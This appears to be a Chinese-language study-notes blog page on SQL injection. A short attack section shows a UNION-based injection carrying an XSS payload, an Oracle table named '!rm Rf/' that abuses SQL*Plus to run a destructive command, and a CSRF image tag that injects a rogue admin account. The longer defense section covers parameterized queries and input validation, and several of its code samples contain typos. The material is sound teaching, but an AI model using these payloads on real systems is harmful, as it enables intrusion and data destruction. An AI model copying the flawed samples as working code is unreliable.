<h3 id="使用混合攻击"><a href="#使用混合攻击" class="headerlink" title="使用混合攻击"></a>使用混合攻击</h3><p>利用多种漏洞混合攻击</p>
<h4 id="利用捕获的数据"><a href="#利用捕获的数据" class="headerlink" title="利用捕获的数据"></a>利用捕获的数据</h4><p>利用SQL注入读取权限，账户，口令</p>
<h4 id="创建跨站脚本"><a href="#创建跨站脚本" class="headerlink" title="创建跨站脚本"></a>创建跨站脚本</h4><p>在SQL注入不能回显时，可以注入反射XSS来返回输出</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">https:<span class="token comment">//www.example.org/MyOrders.php?orderType=123+UNION+SELECT+1,'&lt;script&gt;alert(1)&lt;/script&gt;',1</span>
<span class="token comment">#测试xss,如果没有过滤就会执行成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="在Oracle上运行操作系统命令"><a href="#在Oracle上运行操作系统命令" class="headerlink" title="在Oracle上运行操作系统命令"></a>在Oracle上运行操作系统命令</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token string">"!rm Rf/"</span> <span class="token punctuation">(</span>a varchar2 <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#该命令能被Oracle接受</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果DBA或开发人员使用带spool命令（DBA编写动态SQL脚本时经常使用的技术）的 SQL*Plus脚本，那么SQL*Plus会清除上述例子中的双引号以便访问该对象。接下来SQL*Plus 会将感叹号解析成主机命令（UNIX中是！，Windows和VMS中是$），并将感叹号后面的内容作为操作系统命令执行。</p>
<p>下面是一个易受攻击的SQL*Plus脚本的例子。它创建了一个名为test.sql的spool文件， 之后执行该文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SPOOL test.sql
SELECT table_name FROM all_tables WHERE <span class="token assign-left variable">owner</span><span class="token operator">=</span><span class="token string">'SCOTT'</span><span class="token punctuation">;</span>
SPOOL OFF
@test.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="利用验证过的漏洞"><a href="#利用验证过的漏洞" class="headerlink" title="利用验证过的漏洞"></a>利用验证过的漏洞</h4><p>如果管理员在应用程序中完全可信，那么他们将能够直接在数据库中执行任意SQL查询。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">https:<span class="token comment">//www.example.org/admin/ViewUser.aspx?UID=123</span>
<span class="token comment">#若UID是管理员,就可以直接利用管理员权限攻击</span>

<span class="token comment">#构造跨站伪造,诱导管理员帮助我们执行命令</span>
<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">" https://www.example.org/admin/ViewUser.aspx?UID=123;+INSERT+INTO+USERS+(username,password,isAdmin)+VALUES+('pablo','quest45th', true)"</span><span class="token operator">&gt;</span>
<span class="token comment">#若管理员点击图片就会帮我们创建一个新的管理员用户,这个用户我们能掌握。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="代码层防御"><a href="#代码层防御" class="headerlink" title="代码层防御"></a>代码层防御</h2><h3 id="领域驱动的安全"><a href="#领域驱动的安全" class="headerlink" title="领域驱动的安全"></a>领域驱动的安全</h3><p>领域驱动的安全(Domain Driven Security, DDS)是一种设计代码的方法，以这种方法设计的代码可以避免典型的注入问题</p>
<p>领域驱动的安全是一种开发方法，它的目标是帮助开发人员进行推理并缓解任何类型的注入攻击的威胁——包括SQL注入和跨站脚本攻击。领域驱动的安全是开发人员为开发人员创建的理念，它的灵感来自于Eric Evans提出的领域驱动设计，它试图充分利用来自于DDD的概念以提高应用程序的安全性。</p>
<p>简单来说，就是把所有过滤、处理的过程封装成一个类，将这个处理类放在输出到服务器之间，自动过滤</p>
<p>当然，过滤不能完全处理，使用参数化语言也是明智选择，有时编码也能解决问题，但是考虑到不同数据库的处理不同，也会衍生相应问题</p>
<h3 id="使用参数化语言"><a href="#使用参数化语言" class="headerlink" title="使用参数化语言"></a>使用参数化语言</h3><p>大多数现代编程语言和数据库访问API可以使用占位符或绑定变量来向SQL查询提供参数(而非直接对用户输入进行操作)。通常称之为参数化语句</p>
<p>虽然它们不会修改传递给数据库的内容，但如果正在调用的数据库功能在存储过程或函数的实现中使用了动态SQL，那么仍然可能出现SQL注入。Microsoft SQL Server和Oracle长期受该问题的困扰，因为它们之前附带安装了很多内置的易受SQL注入攻击的存储过程。</p>
<p>二次注入也可能实现</p>
<p>并不是所有的SQL语句都可以参数化。特别是只能参数化数据值，而不能参数化SQL标识符或关键字。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Username <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
Password <span class="token operator">=</span> request <span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>
<span class="token keyword">Sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='"</span> <span class="token operator">+</span> Username <span class="token operator">+</span> <span class="token string">"'AND password='"</span><span class="token operator">+</span>Password <span class="token operator">+</span> <span class="token string">"'"</span>
Result <span class="token operator">=</span> Db<span class="token punctuation">.</span><span class="token keyword">Execute</span><span class="token punctuation">(</span><span class="token keyword">Sql</span><span class="token punctuation">)</span>
<span class="token keyword">If</span> <span class="token punctuation">(</span>Result<span class="token punctuation">)</span> <span class="token comment">/* successful login */</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这是一段易受攻击代码，下面将会对它参数化</p>
<h4 id="Java中的参数化语句"><a href="#Java中的参数化语句" class="headerlink" title="Java中的参数化语句"></a>Java中的参数化语句</h4><p>Java提供了JDBC框架(在java.sql和javax.sql命名空间中实现)，作为独立于供应商的数据库访问方法。JDBC支持多种多样的数据库访问方法，包括通过PreparedStatement类来使用参数化语句。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Connection</span> con <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>connectionstring<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span> 
<span class="token class-name">PreparedStatement</span> lookupusers <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//将参数添加到SQL查询中</span>
lookupUser<span class="token punctuation">.</span>setstring <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在位置1添加字符串</span>
lookupUser<span class="token punctuation">.</span>setstring <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在位置2添加字符串</span>
rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//添加参数时（通过使用不同的ser&lt;type&gt;函数，比如setString）指定了问号(?)占位符的编号位置（从1开始）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在J2EE应用中，除了使用Java提供的JDBC框架外，通常还可以使用附加的包来高效地访问数据库。常用的访问数据库的持久化框架为Hibernate。</p>
<p>除了可以使用固有的SQL功能和前面介绍的JDBC功能外，Hibernate还提供了自己的功能来将变量绑定到参数化语句。Query对象提供了使用命名参数(使用冒号指定，parameter) 或JDBC风格的问号占位符(?)的方法。</p>
<p>下面的例子展示了如何使用带命名参数的Hibernate：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">string sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=:username AND"</span> <span class="token operator">+</span> <span class="token string">"password=:password"</span><span class="token punctuation">;</span>
<span class="token class-name">Query</span> lookupUser <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//将参数添加到SQL查询中</span>
lookupUsers<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 添加 username</span>
lookupUsers<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//添加 password</span>
<span class="token class-name">List</span> rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来的例子展示了如何在Hibernate的参数中，使用JDBC风格的问号占位符。请注意， Hibernate从0开始而不是像JDBC那样从1开始对参数进行编号。因此，列表中的第一个参数为0，第二个为1</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">string sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span>
<span class="token class-name">Query</span> lookupUser <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//将参数添加到SQL查询中</span>
lookupUser<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//添加username</span>
lookupUser<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//添加password</span>
<span class="token class-name">List</span> rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="NET-C-中的参数化语句"><a href="#NET-C-中的参数化语句" class="headerlink" title=".NET(C#)中的参数化语句"></a>.NET(C#)中的参数化语句</h4><p>Microsoft .NET提供了很多不同的访问方式，它们使用ADO.NET框架来参数化语句。ADO.NET还提供了附加的功能，可以进一步检查提供的参数，比如对提交的数据执行类型检查等。</p>
<p>根据访问的数据库类型的不同，ADO.NET提供了4种不同的数据提供程序:用于Microsoft SQL Server 的 System.Data.SqlClient，用于 Oracle 数据库的 System.Data.OracleClient,以及分别用 于OLE DB和ODBC数据源的System.Data.OleDb和System.Data.Odbc</p>
<p>ADO.NET数据提供程序以及参数命名语法</p>
<table>
<thead>
<tr>
<th>数据提供程序</th>
<th>参数语法</th>
</tr>
</thead>
<tbody><tr>
<td>System.Data.SqlClient</td>
<td>@parameter</td>
</tr>
<tr>
<td>System.Data.OracleClient</td>
<td>:parameter(只能位于参数化的SQL命令文本中)</td>
</tr>
<tr>
<td>System.Data.OleDb</td>
<td>带问号占位符(?)的位置参数</td>
</tr>
<tr>
<td>System.Data.Odbc</td>
<td>带问号占位符(?)的位置参数</td>
</tr>
</tbody></table>
<p>使用SqlClient数据提供程序将其重写为.NET格式的参数化语句</p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);
string Sql = "SELECT * FROM users WHERE username=@username" + "AND password=@password";
cmd = new SqlCommand(Sql, con); 
//将参数添加到SQL查询中
cmd.Parameters.Add("@username",//参数名
                   SqlDbType.NVarChar,//数据类型
                   16);//长度
cmd.Parameters.Add("@password",
                   SqlDbType.NVarChar,
                   16);
cmd.Parameters.Value["@username"]=username;//设置参数
cmd.Parameters.Value["@password"]=password;//提供参数值
reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用OracleClient数据提供程序重写的同一.NET格式的参数化语句。 在命令文本（SQL字符串）中的参数前面添加了冒号，而不是在代码的其他位置</p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);
string Sql = "SELECT * FROM users WHERE username=:username" + "AND password=:password";
cmd = new SqlCommand(Sql, con); 
//将参数添加到SQL查询中
cmd.Parameters.Add("username",//参数名
                   SqlDbType.NVarChar,//数据类型
                   16);//长度
cmd.Parameters.Add("password",
                   SqlDbType.NVarChar,
                   16);
cmd.Parameters.Value["username"]=username;//设置参数
cmd.Parameters.Value["password"]=password;//提供参数值
reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用OleDbClient数据提供程序重写的同一.NET格式的参数化语句。 使用OleDbClient或OleDb数据提供程序时，必须按照正确的问号占位符顺序来添加参数</p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);
string Sql = "SELECT * FROM users WHERE username=? + "AND password=?";
cmd = new SqlCommand(Sql, con); 
//将参数添加到SQL查询中
cmd.Parameters.Add("@username",//参数名
                   SqlDbType.NVarChar,//数据类型
                   16);//长度
cmd.Parameters.Add("@password",
                   SqlDbType.NVarChar,
                   16);
cmd.Parameters.Value["@username"]=username;//设置参数
cmd.Parameters.Value["@password"]=password;//提供参数值
reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="PHP中的参数化语句"><a href="#PHP中的参数化语句" class="headerlink" title="PHP中的参数化语句"></a>PHP中的参数化语句</h4><p>PHP同样包含很多用于访问数据库的框架。本节介绍三种最常见的框架：访问MySQL数据库的mysqli包，PEAR::MDB2包（它替代了流行的PEAR::DB包）以及新的PHP数据对象（PHP Data Object, PDO)框架，它们均为使用参数化语句提供了便利。</p>
<p>mysqli包适用于PHP 5.x，可以访问MySQL 4.1及之后的版本。通过使用问号占位符来支持参数化语句。下面的例子展示了一条使用mysqli包的参数化语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//将参数添加到SQL查询中</span>
<span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token comment">//将参数作为字符串绑定</span>
<span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当在PHP中使用PostgreSQL数据库时，PHP 5.1.0引入了一个简单的方法以便使用参数化的查询语句。该方法名为pg_query_params(),它允许开发人员在同一行代码内提供SQL查询 和参数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query_params</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$1</span></span> AND password=<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PEAR::MDB2包是一种被广泛使用且独立于供应商的数据库访问框架，MDB2支持使用冒号字符的命名参数和问号占位符两种方式来定义参数。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$mdb2</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token class-name static-context">MDB2</span><span class="token operator">::</span><span class="token function">factory</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span>
<span class="token variable">$types</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//设置数据类型</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$mdb2</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token constant">MDS2_PREPARE_MANIP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//要传递的参数</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>PDO包含在PHP 5.1及之后的版本中。它是一个面向对象且独立于供应商的数据层，用于访问数据库。PDO既支持使用冒号字符的命名参数，也支持使用问号占位符定义的参数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM uses WHERE username=:username AND"</span><span class="token operator">+</span><span class="token string double-quoted-string">"password=:password"</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$dbh</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//绑定值和数据类型</span>
<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':username'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':passeord'</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="PL-SQL中的参数化语句"><a href="#PL-SQL中的参数化语句" class="headerlink" title="PL/SQL中的参数化语句"></a>PL/SQL中的参数化语句</h4><p>Oracle PL/SQL同样支持在数据库层代码中使用参数化查询。PL/SQL支持使用带编号的冒号字符(例如:1)来绑定参数。使用带绑定参数的PL/SQL在匿名的 PL/SQL块中构造参数化语句：</p>
<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">DECLARE</span> username varchar2<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
password varchar2<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">result</span> integer<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span> <span class="token keyword">Execute</span> <span class="token keyword">immediate</span> <span class="token operator">*</span> <span class="token keyword">SELECT</span> <span class="token function">count</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token operator">:</span><span class="token number">1</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token operator">:</span><span class="token number">2</span>' <span class="token keyword">into</span> <span class="token keyword">result</span> <span class="token keyword">using</span> username<span class="token punctuation">,</span> password<span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="移动应用中的参数化语句"><a href="#移动应用中的参数化语句" class="headerlink" title="移动应用中的参数化语句"></a>移动应用中的参数化语句</h3><p>基于iOS和Android的设备都具有内建于设备(in-device)的数据库支持，并提供了创建、更新和查询这些数据库的API。</p>
<h4 id="iOS应用程序中的参数化语句"><a href="#iOS应用程序中的参数化语句" class="headerlink" title="iOS应用程序中的参数化语句"></a>iOS应用程序中的参数化语句</h4><p>对于iOS系统，用于开发应用的API通过SQLite库libsqlite3.dylib支持SQLite。如果直接使用SQLite(而不是通过Apple框架Core Data),那么最流行的框架是FMDB。使用FMDB框架时，可以使用executeUpdate()方法构建参数化的insert语句：</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">[db executeUpdate:@"INSERT INTO artists (name) VALUES (?)",@"Sinead O'Connor"];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>与之类似，如果想查询数据库，可以使用executeQuery()方法：</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">FMResultSet *rs = [db executeQuery:@"SELECT * FROM songs WHERE artist=?",@"Sinead O'Connor"];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Android应用程序中的参数化语句"><a href="#Android应用程序中的参数化语句" class="headerlink" title="Android应用程序中的参数化语句"></a>Android应用程序中的参数化语句</h4><p>Android设备也包含了用于访问SQLite数据库子系统的AM。该API支持参数化语句，开发人员可以分别提供查询和数据。</p>
<p>对于insert语句，可以使用SQLiteStatement类：</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">statement = db.compileStatement("INSERT INTO artists (name) VALUES (?)");
statement.bind(1, "Sinead O'Connor");
statement.executeInsert();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>当查询数据库时，只须在SQLite-Database对象上直接使用query()</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">db.query("songs",
new String[ ] { "title" } /* columns to return */, "artist = ?" /* where clause */,
new String [ ] { "Sinead O'Connor" } /* parameters to bind */,
null /* group by */,
null /* having */,
null /* order by */
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="HTML5浏览器存储中的参数化语句"><a href="#HTML5浏览器存储中的参数化语句" class="headerlink" title="HTML5浏览器存储中的参数化语句"></a>HTML5浏览器存储中的参数化语句</h4><p>在HTML5标准中可以使用两种类型的存储——Web SQL Database规范和Web Storage规范。该规范中包含了一个简单的方法用于创建参数化查询，即使用executeSql())方法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">t<span class="token punctuation">.</span>executeSql<span class="token punctuation">(</span><span class="token string">'SELECT * FROM songs WHERE artist=? AND song=?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>artist<span class="token punctuation">,</span> songName<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token keyword">data</span><span class="token punctuation">)</span> {
<span class="token comment">//对数据执行某些操作</span>
}<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在上面的代码中，t代表事务(transaction), SQL语句将在该事务中执行。在SQL语句中使用问号作为占位符，并提供了一个参数数组，该数组中元素的顺序就是这些参数应用于SQL 语句的顺序。最后一个参数是回调函数，用于处理从数据库返回的数据。</p>
<p>Web Storage规范则使用setltem()、getltem()和removeltem()等方法，提供了一种简单的键/值对的存储方式。在该规范中并没有通过字符串连接来构建语句的查询语言，因此类似于SQL 注入这样的攻击对Web Storage无效。</p>
<h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><p>输入验证是指测试应用程序接收到的输入，以保证其符合应用程序中标准定义的过程。它可以简单到将参数限制成某种类型，也可以复杂到使用正则表达式或业务逻辑来验证输入。</p>
<p>白名单验证(有时称为包含验证或正验证)和黑名单验证(有时称 为排除验证或负验证)。</p>
<h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>白名单验证是只接收已记录在案的良好输入的操作。</p>
<p>要点:</p>
<p>输入的数据是否在白名单规则内</p>
<p>数据类型是否满足</p>
<p>数据大小是否正确</p>
<p>数据范围</p>
<p>数据内容</p>
<p>实现内容验证的常用方法是使用正则表达式。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#验证字符串中是否包含美国邮政编码：</span>
^<span class="token punctuation">\</span>d<span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">(</span>-<span class="token punctuation">\</span>d<span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span>?$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>该正则表达式按下列规则匹配5位和5位加4位的邮政编码：</p>
<p>^\d{5}：准确匹配字符串开头的5位数字</p>
<p>(-\d{4})?：准确匹配可能存在（出现）或完全不存在（未出现）的破折号字符加4位数字。</p>
<p>$:出现在字符串末尾。如果字符串末尾包含附加的内容，正则表达式将不匹配。</p>
<p>设计输入验证和处理策略</p>
<ul>
<li><p>在应用程序输入层使用白名单输入验证以便验证所有用户输入都符合应用要接 收的内容。应用只允许接收符合期望格式的输入。</p>
</li>
<li><p>在客户端浏览器上同样执行白名单输入验证，这样可以防止为用户输入不可接 收的数据时服务器和浏览器间的往返传递。不能将该操作作为安全控制手段，因为攻击者可以修改来自用户浏览器的所有数据。</p>
</li>
<li><p>在Web应用防火墙（WAF）层使用黑名单和白名单输入验证（以漏洞“签名”和“有 经验”行为的形式）以便提供入侵检测/阻止功能和监视应用攻击。</p>
</li>
<li><p>在应用程序中自始自终地使用参数化语句以保证执行安全的SQL执行。</p>
</li>
<li><p>在数据库中使用编码技术以便在动态SQL中使用输入时安全地对其编码。</p>
</li>
<li><p>在使用从数据库中提取的数据之前恰当地对其进行编码。例如，将浏览器中显示的数据针对跨站脚本进行编码。</p>
</li>
</ul>
<h5 id="用已知值进行检验"><a href="#用已知值进行检验" class="headerlink" title="用已知值进行检验"></a>用已知值进行检验</h5><p>将输入值与一个有效值的列表进行比较，如果输入值不在列表中，就拒绝该输入，这是一种强大但常常未被充分利用的检验输入值的方法。通过将值与一个列表进行比较，可以完全控制可能的输入值以及输入可能通过的代码路径。</p>
<p>间接输入(input indirection)是另一种用已知值进行检验的方法。在这种方法中，服务器端并不接收直接来自客户端的值，客户端呈现一个允许值的列表，并向服务器端提交选中值的索引。</p>
<h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单验证是只拒绝己记录在案的不良输入的操作，它通过浏览输入的内容来查找是否存在己知的不良字符、字符串或模式。</p>
<p>在使用黑名单的同时结合使用输出编码以保证对传递到其他位置（比如，传递给数据库）的输入进行附加检查，从而保证能正确地处理该输入以防止SQL注入。</p>
<h4 id="Java中的输入验证"><a href="#Java中的输入验证" class="headerlink" title="Java中的输入验证"></a>Java中的输入验证</h4><p>Java中的输入验证支持专属于正在使用的框架。</p>
